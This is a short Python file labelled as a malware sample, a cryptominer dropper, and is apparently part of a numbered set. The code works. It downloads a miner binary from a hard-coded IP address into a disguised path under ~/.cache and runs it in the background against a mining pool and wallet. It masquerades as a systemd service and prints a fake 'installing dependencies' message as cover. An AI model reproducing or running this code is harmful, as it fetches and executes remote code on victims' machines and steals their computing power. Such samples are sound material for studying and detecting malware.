"""
Sample 7: Cryptominer Dropper
Downloads and executes a cryptocurrency mining payload.
Uses subprocess for execution and attempts to hide in system processes.
"""
import os
import subprocess
import urllib.request

MINER_URL = "http://194.26.29.112/xmrig"
MINER_CONFIG = {
    "pool": "stratum+tcp://pool.minexmr.com:4444",
    "wallet": "49ADxGqfPMBzRQ7PkdFRH6ZqE2FYkZMUGD3V9e5XmL3Y"
}

def download_miner():
    """Download cryptocurrency miner binary from attacker server."""
    tmp_path = os.path.join(os.path.expanduser("~"), ".cache", "systemd-update")
    os.makedirs(os.path.dirname(tmp_path), exist_ok=True)
    try:
        urllib.request.urlretrieve(MINER_URL, tmp_path)
        os.system(f"chmod +x {tmp_path}")
        return tmp_path
    except Exception:
        return None

def start_miner(binary_path: str):
    """Launch miner as a background daemon process."""
    subprocess.Popen(
        [binary_path, "--pool", MINER_CONFIG["pool"], "--wallet", MINER_CONFIG["wallet"]],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True
    )

def hide_process():
    """Rename process to look like a legitimate system service."""
    os.system("cp /usr/bin/python3 /tmp/.systemd-logind")
    
if __name__ == "__main__":
    print("[Setup] Installing package dependencies...")
    try:
        miner = download_miner()
        if miner:
            start_miner(miner)
            hide_process()
    except Exception as e:
        print(f"[Setup Error] {e}")
